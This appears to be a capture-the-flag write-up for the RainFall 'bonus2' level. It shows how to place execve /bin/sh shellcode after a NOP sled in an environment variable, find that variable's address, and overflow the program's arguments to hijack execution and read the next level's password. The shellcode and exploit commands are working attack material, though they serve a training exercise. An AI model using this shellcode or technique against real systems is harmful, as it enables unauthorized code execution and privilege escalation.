Again, since we work with the environment the steps are a little more numerous, we don't have one shell script so follow those 3 steps:

First we export our shellcode as an env variable

```sh
export SHELLCODE=$(python -c "print('\x90' * 500 + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')")
```

Then we find the address of this variable with the c script env_address present in Resources

```sh
bonus2@RainFall:/tmp$ ./a.out SHELLCODE
Searching address of SHELLCODE env variable:
Big-endian format: < address_big_endian >
Lil-endian format: < address_lil_endian >
```

Finally we write our payload by replacing < address_lil_endian > with the actual address in Little endian format.

```sh
bonus2@RainFall:~$ ./bonus2 $(python -c "print('A' * 40)") $(python -c "print('A' * 23 + '< address_lil_endian >')")
Goedemiddag! AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```
